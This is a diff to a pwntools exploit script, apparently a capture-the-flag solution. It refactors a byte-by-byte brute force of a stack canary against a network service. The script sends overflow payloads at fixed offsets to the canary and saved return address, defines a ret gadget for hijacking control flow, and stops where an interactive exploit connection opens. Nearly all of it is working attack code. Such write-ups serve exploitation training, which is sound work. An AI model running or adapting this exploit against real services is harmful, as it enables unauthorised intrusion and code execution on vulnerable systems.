@@ -11,7 +11,7 @@ PORT     = 0  # PORT_PLACEHOLDER
 
 # ── offsets ───────────────────────────────────────────────────────────────────
 OFFSET_TO_CANARY = 72
-OFFSET_TO_RIP    = 88   # canary + saved RBP
+OFFSET_TO_RIP    = 88   # canary (8) + saved RBP (8)
 
 # ── gadgets ───────────────────────────────────────────────────────────────────
 GADGET = 0x0000000000401530   # ret — stack alignment
@@ -22,29 +22,39 @@ def conn(interactive=False):
         return remote('127.0.0.1', 4444, level=level)
     return remote(HOSTNAME, PORT, level=level)
 
+
+def try_byte(known, bval):
+    r = conn()
+    try:
+        r.recvuntil(b"wish\n")
+        payload = b"A" * OFFSET_TO_CANARY + known + bytes([bval])
+        r.send(payload)
+        response = r.recv(timeout=0.2)
+        return b'OK' in response
+    except Exception:
+        return False
+    finally:
+        r.close()
+
+
 def main():
     # ── leak phase (canary brute-force) ───────────────────────────────────────
     known = b"\x00"
 
     for i in range(7):
+        p = log.progress(f'Bruteforcing byte {i+1}')
         for bval in range(256):
-            guess = known + bytes([bval])
-            payload = b"A" * OFFSET_TO_CANARY + guess
-            r = conn()
-            r.recvuntil(b"wish\n")
-            r.send(payload)
-            try:
-                data = r.recv(timeout=0.2)
-            except EOFError:
-                data = b""
-            r.close()
-            if b"OK" in data:
-                known = guess
-                log.success(f"byte {i+1}: {bval:#04x}")
+            p.status(f'Trying byte: {bval:#04x}')
+            if try_byte(known, bval):
+                known += bytes([bval])
+                p.success(f"Found: {bval:#04x}, canary so far: {known.hex()}")
                 break
+        else:
+            p.failure(f'Failed to find byte {i+1}')
+            return
 
     canary = u64(known)
-    log.info(f"canary = {canary:#x}")
+    log.success(f"canary = {canary:#x}")
 
     # ── exploit phase ─────────────────────────────────────────────────────────
     r = conn(interactive=True)
